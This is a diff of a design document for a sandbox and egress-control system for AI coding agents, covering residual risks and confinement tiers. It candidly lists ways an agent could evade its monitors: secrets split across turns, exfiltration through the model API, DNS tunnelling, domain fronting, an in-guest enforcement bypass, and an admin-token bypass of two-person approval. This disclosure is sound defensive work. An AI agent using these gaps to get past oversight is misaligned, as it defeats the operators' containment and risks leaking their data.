   split across turns are missed. The primary inadvertent-leak paths (a fresh paste,
   a `tool_result` of a just-read file) are the last element and are covered.
-- A single span larger than `max_scan_bytes` (default **1 MiB**) or a whole body
-  larger than **32 MiB** is forwarded **unscanned** (recorded `span_oversize` /
-  `body_oversize`). By default this fails **open**; `block` + `on_scanner_error=block`
-  fails it **closed** (refuses the request) for strict operators.
+- A single span over `max_scan_bytes` (default **1 MiB**) or a body over **32 MiB**
+  is forwarded **unscanned** (`span_oversize` / `body_oversize`). Fails **open** by
+  default; `block` + `on_scanner_error=block` fails it **closed**.
 - `POST /v1/messages/batches` (N prompts, different schema) is recorded
-  `uninspected_channel` (and refused under fail-closed block). Base64
-  `image`/`document` attachment bytes are scanned only when `scan_attachments` is
-  enabled (opt-in; off by default — binary/large/high-FP). `count_tokens` **is**
-  scanned.
+  `uninspected_channel` (refused under fail-closed block). Base64
+  `image`/`document` bytes are scanned only under `scan_attachments` (opt-in, off
+  by default). `count_tokens` **is** scanned.
 - **Walled-garden coverage (`inspect_forward_egress`, `classified_markers`):**
   inspection extends to the GENERIC plaintext-HTTP forward path (custom connectors)
-  and to MCP/JSON-RPC bodies via the generic walker, and operator `classified_markers`
-  flag proprietary-content egress. But an **HTTPS** connector tunnels via opaque
-  CONNECT and is **uninspected** unless its host is MITM-eligible — the LLM hosts
-  plus any operator-configured corp artifact hosts are MITM'd today
-  (`isMITMHost`, `internal/egress/proxy/mitm.go`), so most non-LLM HTTPS egress remains
-  opaque (a `MITM-all-egress` mode is a deliberate future option, gated on the
-  cert-pinning/non-HTTP-over-443 risks). DNS-tunnel/domain-fronting residuals
+  and to MCP/JSON-RPC bodies via the generic walker, and operator
+  `classified_markers` flag proprietary-content egress. But an **HTTPS** connector
+  tunnels via opaque CONNECT and is **uninspected** unless MITM-eligible
+  (`isMITMHost`, `internal/egress/proxy/mitm.go`), so most non-LLM HTTPS egress
+  stays opaque (a `MITM-all-egress` mode is a deliberate future option, gated on
+  cert-pinning / non-HTTP-over-443 risks). DNS-tunnel and domain-fronting residuals
   (§5 #2, #3) are unchanged.
-- **Upstream corp-proxy hop relaxes the resolved-IP TOCTOU guard.** The upstream
-  corp-proxy mode is a **supported, operator-configured egress lane** (site-config
-  only — not sandbox- or agent-controlled), and is the **intended path for reaching
-  internal / corporate endpoints** (an internal model-inference API, a corp-proxied
-  code-search SaaS, an internal package mirror) from a sandbox that has no direct
-  internet route. The *residual* documented here is one precise relaxation, not the
-  feature: when `p.upstream` is set, the proxy hands the corp proxy the target
-  HOSTNAME rather than a proxy-resolved-and-pinned IP, so `VetHost`'s resolved-IP
-  re-check is skipped for that hop (the corp proxy performs its own outbound
-  DNS+dial, and the sandbox host frequently cannot resolve external names at all —
-  the `p.upstream` branch of step 4 in `evaluate`,
-  `internal/egress/proxy/proxy.go`). **Bounds, stated exactly so operators
-  don't over- or under-read it:** this does NOT make private IPs reachable. Reaching
-  an internal-IP-resolving hostname still requires ALL of — (1) an operator
-  configured the upstream proxy, (2) the run's own egress **policy** allows that
-  hostname (default-deny allowlist + first-use approval + method rules, all
-  unaffected), and (3) the destination is named by HOSTNAME: an agent naming a
-  literal private/loopback/link-local/metadata IP directly is still denied at the
-  earlier literal-IP guard. What is deferred is only the resolved-IP re-check for a
-  policy-allowed *hostname*, to the operator's own corp proxy, for this hop — the
-  same trust the operator already places in that proxy + its corp-root CA.
-- The optional out-of-process **sidecar** (`detector_sidecar_url`) treats an
-  error/timeout/non-200 as a scanner error like the in-process detectors: it fails
-  **open** by default, and `on_scanner_error=block` **does** extend to it, so `block`
-  mode with the sidecar as the *sole* detector refuses the request when the sidecar
-  is down (a down sidecar is recorded `sidecar_error`, distinct from a clean scan).
+- **Upstream corp-proxy hop relaxes the resolved-IP TOCTOU guard.** That mode is a
+  supported, operator-configured egress lane (site-config only — not sandbox- or
+  agent-controlled) and the intended path to internal/corporate endpoints from a
+  sandbox with no direct internet route. The *residual* is one relaxation: with
+  `p.upstream` set the proxy hands the corp proxy the target HOSTNAME rather than a
+  proxy-resolved-and-pinned IP, so `VetHost`'s resolved-IP re-check is skipped for
+  that hop (the `p.upstream` branch of step 4 in `evaluate`,
+  `internal/egress/proxy/proxy.go`). **Bounds, stated exactly so operators don't
+  over- or under-read it:** this does NOT make private IPs reachable. Reaching an
+  internal-IP-resolving hostname still requires ALL of — (1) an operator configured
+  the upstream proxy, (2) the run's own egress **policy** allows that hostname
+  (default-deny allowlist + first-use approval + method rules, all unaffected), and
+  (3) the destination is named by HOSTNAME: a literal
+  private/loopback/link-local/metadata IP is still denied at the literal-IP guard.
+  Only the resolved-IP re-check is deferred, to the operator's own corp proxy.
+- The optional **sidecar** (`detector_sidecar_url`) treats an
+  error/timeout/non-200 as a scanner error like the in-process detectors: fails
+  **open** by default, and `on_scanner_error=block` **does** extend to it, so
+  `block` with the sidecar as the *sole* detector refuses the request when it is
+  down (recorded `sidecar_error`, distinct from a clean scan).
 - **Deferred (documented, not built):** cross-request / split-across-turns secret
-  tracking (a determined agent evades any single-pass scan), field-level **redaction**
-  (corrupts tool I/O + prompt caching), and response-side **SSE** scanning (requires
-  incremental stream parsing). These remain residuals, not silent gaps.
+  tracking, field-level **redaction** (corrupts tool I/O + prompt caching), and
+  response-side **SSE** scanning. Residuals, not silent gaps.
 - The 32 MiB per-request buffer (only when inspection is enabled) raises proxy
-  memory vs. the prior streaming path; it is bounded per-request and relies on the
-  run's cgroup memory limit under high concurrency.
-- **TLS-MITM (`intercept_tls`) residuals:** the proxy now sees DECRYPTED bodies for
-  the intercepted hosts (added trust surface — the per-run CA private key in proxy
-  memory). The MITM core (terminate → leaf-mint → inspect → re-originate) is
-  proven by an in-process test (agent trusts the CA, handshake + block/alert work),
-  and the full container path — the agent image trusting the per-run CA and a real
-  subscription handshake through the proxy — is live-validated by
-  `TestLive_SubscriptionInject` (`test/e2e/live/subscription_test.go`;
-  Docker-gated, not in default CI). **Interactive** runs now install the
-  per-run CA too: the container's main process is `agent-run --idle`
-  (the `idleCmd` in `internal/runner/docker/driver.go`), which calls the same
-  `install_mitm_ca` batch runs use before holding the container open for attach
-  (`deploy/images/claude-code/agent-run`, `deploy/images/common/agent-run-lib.sh`)
-  — so a human driving `claude` in the attach shell trusts the proxy's TLS
-  termination exactly as a batch run does. SDK certificate pinning would break
-  MITM (none today); the reverse-proxy API-key route remains the robust default.
+  memory vs. the prior streaming path; bounded per-request, relying on the run's
+  cgroup memory limit under high concurrency.
+- **TLS-MITM (`intercept_tls`) residuals:** the proxy sees DECRYPTED bodies for the
+  intercepted hosts (added trust surface — the per-run CA private key in proxy
+  memory). The MITM core (terminate → leaf-mint → inspect → re-originate) is proven
+  by an in-process test, and the full container path by `TestLive_SubscriptionInject`
+  (`test/e2e/live/subscription_test.go`; Docker-gated, not in default CI).
+  **Interactive** runs install the per-run CA too: the container's main process is
+  `agent-run --idle` (`idleCmd`, `internal/runner/docker/driver.go`), which calls
+  the same `install_mitm_ca` batch runs use (`deploy/images/claude-code/agent-run`,
+  `deploy/images/common/agent-run-lib.sh`), so a human driving `claude` in the
+  attach shell trusts the proxy's TLS termination exactly as a batch run does. SDK
+  certificate pinning would break MITM (none today); the reverse-proxy API-key route
+  remains the robust default.
 - **JVM (keystore) and Deno (`DENO_CERT`) trust stores are not wired.**
-  `install_mitm_ca` (`deploy/images/common/agent-run-lib.sh`) writes the
-  per-run CA for OpenSSL-shaped clients (`SSL_CERT_FILE`/`REQUESTS_CA_BUNDLE`/
-  `CURL_CA_BUNDLE`) and Node (`NODE_EXTRA_CA_CERTS`) — it never imports the CA
-  into a JVM's `cacerts` keystore or sets `DENO_CERT`. A run whose task trusts a
-  MITM'd host through a JVM HTTP client or the Deno runtime fails the TLS
-  handshake to that host (closed-direction failure — a loud error, not a
-  silent trust bypass or leaked credential) rather than succeeding through the
-  intercept. Fixing this needs a per-runtime trust-store import at the same
-  install point, tracked as a follow-up. **Scope of the impact (important for JVM /
-  Deno workloads):** MITM content-inspection is **not** mandatory for any egress
-  class — only the LLM hosts (`api.anthropic.com`/`api.openai.com`) and any
-  operator-configured corp artifact hosts (`MITMHosts`) are intercepted
-  (`isMITMHost`, `internal/egress/proxy/mitm.go`); **every other host, including internal
-  endpoints reached via the upstream corp-proxy lane, is an opaque CONNECT tunnel
-  that is never TLS-terminated by Wardyn.** So a JVM/Deno client reaching an
-  internal API or corp SaaS is unaffected — the trust-store gap only bites when such
-  a client is pointed at one of the explicitly MITM-eligible hosts. Operators who
-  need a JVM/Deno client to reach a MITM'd host today should route it through a
-  non-inspected lane or wait on the trust-store-import follow-up.
+  `install_mitm_ca` writes the per-run CA for OpenSSL-shaped clients
+  (`SSL_CERT_FILE`/`REQUESTS_CA_BUNDLE`/`CURL_CA_BUNDLE`) and Node
+  (`NODE_EXTRA_CA_CERTS`) — never into a JVM's `cacerts` keystore or `DENO_CERT`. A
+  run whose task trusts a MITM'd host through a JVM HTTP client or Deno fails the
+  TLS handshake to that host (closed-direction failure — a loud error, not a silent
+  trust bypass or leaked credential) rather than succeeding through the intercept.
+  Fixing this needs a per-runtime trust-store import at the same install point,
+  tracked as a follow-up. **Scope:** MITM inspection is **not** mandatory for any
+  egress class — only the LLM hosts (`api.anthropic.com`/`api.openai.com`) and
+  operator-configured corp artifact hosts (`MITMHosts`) are intercepted; **every other host, including internal endpoints
+  reached via the upstream corp-proxy lane, is an opaque CONNECT tunnel Wardyn never
+  TLS-terminates.** So a JVM/Deno client reaching an internal API or corp SaaS is
+  unaffected — the gap bites only when such a client is pointed at a MITM-eligible
+  host. Route it through a non-inspected lane, or wait on the follow-up.
 
 ### Four-eyes on egress approvals is bypassable by the admin token, by design
 
@@ -1077,54 +1072,46 @@ DECIDES an `egress_domain` approval is not the human who created the run —
 four-eyes on the one decision that widens what a running agent can reach. It is
 published here rather than in §4 because of the exemption it ships with.
 
-**A bare `WARDYN_ADMIN_TOKEN` caller BYPASSES the rule.** That caller is
-attributed `system`/`admin-token` (`actorFromRequest`, FIX #10) precisely
-because a shared token carries NO per-human identity — there is no second human
-to compare it against, and `X-Wardyn-Principal` is deliberately ignored off
-local mode so a token bearer cannot forge one. Refusing the token instead would
-lock an operator out of their own approval queue exactly when SSO is broken, so
-the bypass is the deliberate break-glass rather than an oversight.
+**A bare `WARDYN_ADMIN_TOKEN` caller BYPASSES the rule.** That caller is attributed
+`system`/`admin-token` (`actorFromRequest`, FIX #10) precisely because a shared
+token carries NO per-human identity — there is no second human to compare it
+against, and `X-Wardyn-Principal` is deliberately ignored off local mode so a token
+bearer cannot forge one. Refusing the token instead would lock an operator out of
+their own approval queue exactly when SSO is broken, so the bypass is the
+deliberate break-glass rather than an oversight.
 
 The residual is therefore precise: **anyone holding the admin token can
-single-handedly approve their own run's egress under a deployment that believes
-it has four-eyes.** What bounds it is disclosure, not prevention — every bypass
-writes an `approval.second_human.bypass` audit event beside the
-`actor_type=system` `approval.decide`, so a SIEM rule can alert on one, and the
-gate is only as strong as the operator's handling of that token: SSO configured,
-token held out of band. Local mode carries the same shape under a different
-label — the injected operator IS a verified human, so a self-decision there is
-refused like any other, which is why this switch is not one to turn on for a
-single-dev machine.
+single-handedly approve their own run's egress under a deployment that believes it
+has four-eyes.** What bounds it is disclosure, not prevention — every bypass writes
+an `approval.second_human.bypass` audit event beside the `actor_type=system`
+`approval.decide`, so a SIEM rule can alert on one, and the gate is only as strong
+as the operator's handling of that token: SSO configured, token held out of band.
+Local mode carries the same shape under a different label — the injected operator
+IS a verified human, so a self-decision there is refused like any other, which is
+why this switch is not one to turn on for a single-dev machine.
 
 ### Known latent vulnerabilities
 
-We publish known-uncalled findings here rather than let them sit silently in a
-scanner's ignore-list.
+We publish known-uncalled findings here rather than let them sit in a scanner's
+ignore-list.
 
 - **GO-2026-5932** — `golang.org/x/crypto/openpgp` is flagged unmaintained and
   unsafe by design, with **no fix available** (`Fixed in: N/A`). The
-  `golang.org/x/crypto` *module* reaches our build via two dependency paths —
-  `filippo.io/age` (used for our secret-encryption primitives) imports
-  `chacha20poly1305`, `hkdf`, `curve25519`, and `scrypt`, and Wardyn itself
-  imports `golang.org/x/crypto/ssh` directly for the SSH gateway
-  (`internal/api/sshgateway.go`, `sshgateway_channels.go`, `sshkeys.go`;
-  `golang.org/x/crypto` is a direct `require` in `go.mod`) — a sibling package
-  of `openpgp` in the same module, which pulls in the *module* as a build
-  dependency. No Wardyn code
-  path, and no dependency Wardyn actually calls, imports the `openpgp`
-  subpackage itself (`go mod why golang.org/x/crypto/openpgp` confirms: "main
-  module does not need package golang.org/x/crypto/openpgp"). `govulncheck`'s
-  symbol-level analysis agrees: "Your code is affected by 0 vulnerabilities" —
-  GO-2026-5932 shows up only in the module-level "modules you require" tally,
-  not the call-graph-verified findings.
-  We accept this as a latent, unreachable finding rather than vendoring or
-  forking `x/crypto` to drop the subpackage: there is no upstream fix to take,
-  and the flagged code is dead weight in our binary, never on an execution
-  path. `govulncheck` runs in CI on every push (`.github/workflows/ci.yml`,
-  job `gates (govulncheck)`, both the default and `-tags docker` builds) specifically
-  so that if a future dependency bump ever puts `openpgp` on a *called* path,
-  the symbol-level scan flips from "0 vulnerabilities" to a real finding and
-  CI goes red — this entry is not a standing exemption from that check.
+  `golang.org/x/crypto` *module* reaches our build two ways — `filippo.io/age`
+  (our secret-encryption primitives) imports `chacha20poly1305`, `hkdf`,
+  `curve25519`, `scrypt`, and Wardyn imports `golang.org/x/crypto/ssh` directly
+  for the SSH gateway (`internal/api/sshgateway.go`, `sshgateway_channels.go`,
+  `sshkeys.go`; a direct `require` in `go.mod`) — sibling packages that pull in
+  the module. No Wardyn code path, and no dependency Wardyn calls, imports the
+  `openpgp` subpackage (`go mod why golang.org/x/crypto/openpgp`: "main module
+  does not need package golang.org/x/crypto/openpgp"), and `govulncheck`'s
+  symbol-level analysis agrees ("Your code is affected by 0 vulnerabilities") —
+  it appears only in the module-level tally. Accepted as latent and unreachable
+  rather than vendoring or forking `x/crypto`: there is no upstream fix to take.
+  `govulncheck` runs in CI on every push (`.github/workflows/ci.yml`, job
+  `gates (govulncheck)`, default and `-tags docker` builds) so that a future bump
+  putting `openpgp` on a *called* path flips the scan to a real finding and CI
+  goes red — this entry is not a standing exemption.
 
 ### Console auth token storage
 
@@ -1132,35 +1119,32 @@ The web console (`ui/`) authenticates to the control plane one of two ways, with
 **different at-rest posture**:
 
 - **Admin token (the single-operator local path, shipped today).** `wardynd`
-  never generates or prints this token — it is the value you (or the compose
-  demo, `demo-admin-token`) started it with, `WARDYN_ADMIN_TOKEN`. You paste it
-  into the sign-in screen and it is attached as an `Authorization: Bearer`
-  header on every `/api/v1` request.
-  This token is a full-admin credential held in browser storage, so it carries
-  **XSS-equivalent risk**: any script that runs in the console origin can read it.
-  By default it is kept in **`sessionStorage`** and is gone when the tab/browser
-  closes; ticking **"Remember on this device"** on sign-in persists it to
-  `localStorage` instead (survives restart, larger exposure window). Both stores
-  are same-origin and readable by injected script — the checkbox trades restart
-  convenience for a shorter at-rest window, not for a stronger boundary.
-- **SSO session (the hardened path, shipped v0.5).** The session
-  is carried in an **`HttpOnly` cookie** that page script cannot read, so an
-  injected script cannot exfiltrate it. This is the stronger posture; the
-  admin-token path above is the local/single-operator convenience alternative.
-  See `docs/OPERATIONS.md` "Multi-user: who can change what" for the
-  admin/member contract this session carries.
+  never generates or prints it — it is the value you (or the compose demo,
+  `demo-admin-token`) started it with, `WARDYN_ADMIN_TOKEN`, pasted into the
+  sign-in screen and attached as an `Authorization: Bearer` header on every
+  `/api/v1` request. A full-admin credential in browser storage carries
+  **XSS-equivalent risk**: any script in the console origin can read it. Default
+  is **`sessionStorage`** (gone when the tab/browser closes); ticking **"Remember
+  on this device"** persists it to `localStorage` instead. Both stores are
+  same-origin and readable by injected script — the checkbox trades restart
+  convenience for a shorter at-rest window, not a stronger boundary.
+- **SSO session (the hardened path, shipped v0.5).** Carried in an **`HttpOnly`
+  cookie** page script cannot read, so an injected script cannot exfiltrate it.
+  The stronger posture; the admin-token path is the local/single-operator
+  convenience alternative. See `docs/OPERATIONS.md` "Multi-user: who can change
+  what" for the admin/member contract this session carries.
 
 **Mitigations that exist:** the token is never written to `localStorage` unless
-you opt in; the console is served same-origin (no cross-origin token leak); the
-input field uses `type="password"`/`autoComplete="off"`; every response (API,
-`/healthz` and the SPA alike) carries `Content-Security-Policy`
-(`default-src 'self'`, `frame-ancestors 'none'`, `base-uri`/`object-src 'none'`),
-`X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` and
-`Referrer-Policy: no-referrer` (`securityHeaders` in `internal/api/server.go`),
-so a hostile page cannot frame the console to clickjack an approve.
+you opt in; the console is served same-origin; the input uses
+`type="password"`/`autoComplete="off"`; every response (API, `/healthz`, SPA)
+carries `Content-Security-Policy` (`default-src 'self'`, `frame-ancestors 'none'`,
+`base-uri`/`object-src 'none'`), `X-Frame-Options: DENY`,
+`X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`
+(`securityHeaders`, `internal/api/server.go`), so a hostile page cannot frame the
+console to clickjack an approve.
 
-**Mitigations that do NOT yet exist (honest gaps):** no HSTS — the default
-posture is plain http on loopback, where an HSTS header would poison every other
+**Mitigations that do NOT yet exist (honest gaps):** no HSTS — the default posture
+is plain http on loopback, where an HSTS header would poison every other
 `localhost` port — and the CSP still permits inline **styles** (xterm injects a
 theme `<style>` at runtime). Treat the admin token as a plaintext full-admin
 credential and prefer the SSO path.
@@ -1169,51 +1153,26 @@ credential and prefer the SSO path.
 
 ## 6. Top Engineering Risks
 
-These risks are tracked as explicit obligations, not ignored:
+Tracked as explicit obligations, not ignored. Each is stated in full at the
+residual named beside it.
 
-1. **The model-API exit channel is the single most realistic exfiltration path
-   for a prompt-injected agent.** Fully containing this is impossible. We
-   mitigate by logging, not blocking. Any marketing must not claim exfil-proof.
-
-2. **Per-run SPIRE identity at scale is unprototyped.** Registration-entry churn,
-   mint latency on the task-start hot path, and kill-switch cascade timing could
-   break the identity architecture under load. A load spike before commitment is
-   an explicit pre-v0.5 requirement.
-
-3. **The approval-gates-credential coupling (B5) is the thesis's most novel claim
-   with no prior art.** Its security rests on chain integrity against the
-   delegation-chain-splicing attack (IETF, March 2026) and on a risk classifier
-   whose accuracy is unmeasured. Overclaiming here would repeat the industry's mistake.
-
-4. **In-guest enforcement carries the documented `ld-linux`/`mmap` bypass class.**
-   Must be shipped and marketed strictly as defense-in-depth detection, never as
-   the boundary. The real boundary is structural, enforced out-of-band.
-
-5. **Domain fronting and DNS-tunnel exfil are open below the optional
-   TLS-intercept tier.** The tier itself now SHIPS (off by default, opt-in per
-   policy — §5.1a), but only for operator-listed MITM-eligible hosts —
-   live-validated end-to-end by `TestLive_SubscriptionInject` (Docker-gated,
-   not in default CI); most non-LLM HTTPS egress
-   stays opaque. Per-workspace ephemeral-CA injection into arbitrary agent
-   images is unprototyped.
-
-6. **CC1 hardened-runc is the only tier on hosts where nothing else installs,
-   yet shares the host kernel.** Customers on tier-1 only get materially weaker
-   isolation and must be told so explicitly, or the platform inherits
-   the industry's sandbox-overclaim risk.
-
-7. **A compromised platform operator can defeat audit integrity and policy in v1.**
-   Acceptable for launch only if published honestly; signed action receipts are
-   required to raise this bar and are planned for v1.0 — the hash chain itself
-   ships (migration `0047`).
+| # | Risk | Where stated |
+|---|---|---|
+| 1 | **The model-API exit channel is the single most realistic exfiltration path for a prompt-injected agent.** Fully containing it is impossible; we mitigate by logging, not blocking. **Marketing must not claim exfil-proof.** | residual #1 |
+| 2 | **Per-run SPIRE identity at scale is unprototyped** — registration-entry churn, mint latency on the task-start hot path and kill-switch cascade timing could break the identity architecture under load. A load spike before commitment is an explicit pre-v0.5 requirement. | residual #8 |
+| 3 | **The approval-gates-credential coupling (B5) is the thesis's most novel claim, with no prior art.** Its security rests on chain integrity against delegation-chain-splicing (IETF, March 2026) and on a risk classifier whose accuracy is unmeasured. Overclaiming here would repeat the industry's mistake. | residual #11 |
+| 4 | **In-guest enforcement carries the documented `ld-linux`/`mmap` bypass class** — ship and market it strictly as defense-in-depth detection, never as the boundary. The real boundary is structural, enforced out-of-band. | residual #5 |
+| 5 | **Domain fronting and DNS-tunnel exfil are open below the optional TLS-intercept tier.** The tier ships (off by default, opt-in per policy — §5.1a) but only for operator-listed MITM-eligible hosts, live-validated end-to-end by `TestLive_SubscriptionInject` (Docker-gated, not in default CI); most non-LLM HTTPS egress stays opaque, and per-workspace ephemeral-CA injection into arbitrary agent images is unprototyped. | residuals #2, #3 |
+| 6 | **CC1 hardened-runc is the only tier on hosts where nothing else installs, yet shares the host kernel.** Tier-1-only customers get materially weaker isolation and must be told so explicitly, or the platform inherits the industry's sandbox-overclaim risk. | residual #4, §7 |
+| 7 | **A compromised platform operator can defeat audit integrity and policy in v1.** Acceptable for launch only if published honestly; signed action receipts are required to raise this bar and are planned for v1.0 — the hash chain itself ships (migration `0047`). | residual #9, §4.5 |
 
 ---
 
 ## 7. Confinement Class Claims
 
-Each Confinement Class (CC) carries a precise, honest statement of what it
-does and does not stop. Policy may mandate a minimum CC; the control plane
-refuses to schedule runs on substrates that cannot satisfy the policy.
+Each Confinement Class (CC) carries a precise, honest statement of what it does
+and does not stop. Policy may mandate a minimum CC; the control plane refuses to
+schedule runs on substrates that cannot satisfy the policy.
 
 ```mermaid
 flowchart TB
@@ -1229,93 +1188,89 @@ The ladder runs Fence → Wall → Vault (CC1 → CC2 → CC3), each tier adding
 stronger isolation boundary and a hardware/runtime requirement; policy sets a
 floor and the control plane refuses to schedule below it.
 
-### CC1 — Hardened runc (shared kernel)
+### CC1 — Hardened runc (shared kernel) 🟢 [shipped]
 
 **What it does:**
 - On the shipped Docker path: cap-drop ALL, no-new-privileges, tmpfs `/tmp`
-  **[shipped]**; RuntimeDefault seccomp (never `unconfined`) + host-gated
-  AppArmor (`apparmor=docker-default`) pinning **[shipped]**. userns
-  (`hostUsers:false`), PSS-restricted, and no-hostPath are the Kubernetes path
-  **[v0.5+ — planned]**.
+  **[shipped]**; RuntimeDefault seccomp (never `unconfined`) + host-gated AppArmor
+  (`apparmor=docker-default`) pinning **[shipped]**. userns (`hostUsers:false`),
+  PSS-restricted, and no-hostPath are the Kubernetes path 🟡 **[planned]**.
 - Raises the bar for container-escape via known runc/containerd CVE classes.
-- L0/L1/L2/L3 egress controls (tier-independent) carry the real network
-  defense; isolation here is the thinnest layer.
+- L0/L1/L2/L3 egress controls (tier-independent) carry the real network defense;
+  isolation here is the thinnest layer.
 
 **What it does not stop:**
-- A kernel 0-day provides host root. The shared kernel is the fundamental
-  weakness of this tier; CC1 as the sole boundary is explicitly insufficient
-  for LLM-generated code.
+- A kernel 0-day provides host root. The shared kernel is the fundamental weakness
+  of this tier; CC1 as the sole boundary is explicitly insufficient for
+  LLM-generated code.
 - Any 0-day in runc or containerd that reaches the host kernel.
-- **io_uring host assumption:** CC1 ships no custom seccomp profile (it relies
-  on Docker's `RuntimeDefault`), so it blocks the `io_uring` syscall family
-  (an attack surface that bypasses many seccomp/kprobe controls) only on hosts
-  running Docker ≥ 25.0, whose default profile denies `io_uring_setup`/`_enter`/
-  `_register`. On older daemons io_uring is exposed under `RuntimeDefault`; a
-  regression test (`TestDockerDefaultSeccompProfile_BlocksIoUring`) locks in the
-  vendored default's denial, but nothing probes the live daemon version.
+- **io_uring host assumption:** CC1 ships no custom seccomp profile (it relies on
+  Docker's `RuntimeDefault`), so it blocks the `io_uring` syscall family (an attack
+  surface that bypasses many seccomp/kprobe controls) only on hosts running Docker
+  ≥ 25.0, whose default profile denies `io_uring_setup`/`_enter`/`_register`. On
+  older daemons io_uring is exposed under `RuntimeDefault`; a regression test
+  (`TestDockerDefaultSeccompProfile_BlocksIoUring`) locks in the vendored default's
+  denial, but nothing probes the live daemon version.
 
 **Recommended use:** development environments where the host is already a
 dedicated machine and the threat model does not include adversarial agent
 workloads. Must be explicitly selected; CC2 is the default.
 
-**Deployment note — rootless Docker / Podman (the supported model, and its
-ceiling).** Running the runner against a **rootless** daemon (socket under
-`/run/user/<uid>`, no root) is supported at **CC1 only**. The full CC1 posture is
-rootless-compatible — cap-drop ALL, no-new-privileges, `RuntimeDefault` seccomp
-(never `unconfined`), host-gated AppArmor, retained SELinux labeling
-(`internal/runner/docker/hardening.go`) — and **all tier-independent controls hold
-unchanged**: the per-run gatewayless (`Internal:true`) network, the wardyn-proxy
-sidecar as the sole egress path, brokered **never-resident** credentials (the
-§5.1a exceptions aside), and the three audit streams. **CC2/CC3 are NOT
-available rootless:** current gVisor only starts under rootless Docker with
-`--TESTONLY-unsafe-nonroot`, which disables the
-host isolation Wall exists to provide, and Kata needs device passthrough that
-rootless can't grant (`cmd/wardyn/setup.go` reports both as unsupported). A policy
-that mandates CC2/CC3 on a rootless host is **refused, fail-closed**, by the
-existing runtime probe (`classToRuntime`) — it never silently downgrades. So the
-honest offer on rootless is: CC1 + default-deny egress + brokered creds + the
-hardened runc floor — not Wall/Vault. Pick and pin **one** rootless UID model
+**Deployment note — rootless Docker / Podman (supported, and its ceiling).** A
+**rootless** daemon (socket under `/run/user/<uid>`, no root) is supported at
+**CC1 only**. The full CC1 posture is rootless-compatible — cap-drop ALL,
+no-new-privileges, `RuntimeDefault` seccomp (never `unconfined`), host-gated
+AppArmor, retained SELinux labeling (`internal/runner/docker/hardening.go`) — and
+**all tier-independent controls hold unchanged**: the per-run gatewayless
+(`Internal:true`) network, the wardyn-proxy sidecar as sole egress path, brokered
+**never-resident** credentials (the §5.1a exceptions aside), and the three audit
+streams.
+
+**CC2/CC3 are NOT available rootless:** current gVisor only starts under rootless
+Docker with `--TESTONLY-unsafe-nonroot`, which disables the host isolation Wall
+exists to provide, and Kata needs device passthrough rootless can't grant
+(`cmd/wardyn/setup.go` reports both unsupported). A policy mandating CC2/CC3 on a
+rootless host is **refused, fail-closed**, by the existing runtime probe
+(`classToRuntime`) — never a silent downgrade. Pin **one** rootless UID model
 (host-mode socket, an explicit `user: UID:GID` matching the rootless daemon's
-socket owner, or userns-remap) for the wardynd container; the driver itself is
-UID-agnostic (`client.FromEnv`, no hardcoded socket). **Rootless Podman** speaks
-the Docker Engine API via the same `FromEnv` client but is a *separate* proof from
-rootless Docker (the Docker-compat REST API is a partial emulation). **Probed on
+socket owner, or userns-remap); the driver is UID-agnostic (`client.FromEnv`, no
+hardcoded socket).
+
+**Rootless Podman** speaks the Docker Engine API via the same client but is a
+*separate* proof (the Docker-compat REST API is a partial emulation). **Probed on
 rootless Podman 4.9.3** (`scripts/test-podman.sh`, cgroup v2): the runner-critical
-primitives hold — `--internal` bridge networks are supported and **do** block
-off-host egress (the L0 no-default-route guarantee), the `Runtimes` map is
-populated (CC-gating can read it), `host.docker.internal:host-gateway` resolves,
-the `overlay` storage driver is recognized, and CPU/memory/pids caps **actually
-enforce** (verified by reading a capped container's cgroup v2 `cpu.max`/
-`memory.max`/`pids.max`). **Divergence noted and handled:** Podman's compat
-`docker info` under-reports `CpuCfsQuota` as `false` even though the quota binds.
-Wardyn's resource-cap gate is therefore **post-create and authoritative** — it
-fails a run closed only when the daemon's ContainerCreate response actually reports
-it DISCARDED a requested limit (`verifyCapsEnforced`), which Moby emits on a
-genuinely-uncapped host and Podman never emits for caps it applied. So Podman runs
-are **not** false-positived; the `docker info` booleans are used only as an
-advisory `doctor` hint. Re-run the probe (and `make test-e2e` for the full
-governed-run proof) on your own Podman version before relying on it — this box's
-WSL2 Podman is not a CI fleet.
+primitives hold — `--internal` bridge networks **do** block off-host egress (the L0
+no-default-route guarantee), the `Runtimes` map is populated,
+`host.docker.internal:host-gateway` resolves, `overlay` is recognized, and
+CPU/memory/pids caps **actually enforce**. **Divergence handled:** Podman's compat
+`docker info` under-reports `CpuCfsQuota` as `false` even though the quota binds,
+so Wardyn's resource-cap gate is **post-create and authoritative** — it fails a run
+closed only when ContainerCreate's response reports it DISCARDED a requested limit
+(`verifyCapsEnforced`), which Moby emits on a genuinely-uncapped host and Podman
+never emits for caps it applied. Podman runs are **not** false-positived; the
+`docker info` booleans are an advisory `doctor` hint only. Re-run the probe (and
+`make test-e2e`) on your own Podman version — this box's WSL2 Podman is not a CI
+fleet.
 
 ---
 
-### CC2 — gVisor systrap (default)
+### CC2 — gVisor systrap (default) 🟢 [shipped]
 
 **What it does:**
 - Interposes a userspace kernel (gVisor sentry) between the agent and the host
-  kernel. Syscall-surface attacks are substantially raised: the sentry
-  intercepts and reimplements the Linux syscall ABI in userspace.
-- Defeats the container-escape CVE class that depends on reaching the host
-  kernel directly from the container namespace.
+  kernel. Syscall-surface attacks are substantially raised: the sentry intercepts
+  and reimplements the Linux syscall ABI in userspace.
+- Defeats the container-escape CVE class that depends on reaching the host kernel
+  directly from the container namespace.
 - Runs anywhere Docker runs; no `/dev/kvm` required.
 - In-sandbox `iptables` is partial; egress is therefore enforced outside the
-  sandbox at L0/L1 (this is an architectural requirement, not a limitation).
+  sandbox at L0/L1 (an architectural requirement, not a limitation).
 
 **What it does not stop:**
-- A 0-day in the gVisor sentry itself (a smaller, more auditable surface than
-  the full Linux kernel, but not zero).
-- gVisor compatibility gaps where the sentry falls back to passthrough
-  behavior; workloads that trigger these gaps reduce to CC1.
+- A 0-day in the gVisor sentry itself (a smaller, more auditable surface than the
+  full Linux kernel, but not zero).
+- gVisor compatibility gaps where the sentry falls back to passthrough behavior;
+  workloads that trigger these gaps reduce to CC1.
 - In-sandbox resource limits are at host cgroup granularity only; no in-sandbox
   seccomp or AppArmor (gVisor's sentry handles syscalls before they reach host
   LSMs).
@@ -1325,69 +1280,65 @@ multi-tenant deployment.
 
 ---
 
-### CC3 — Kata microVM
+### CC3 — Kata microVM 🟡 [experimental]
 
 **What it does:**
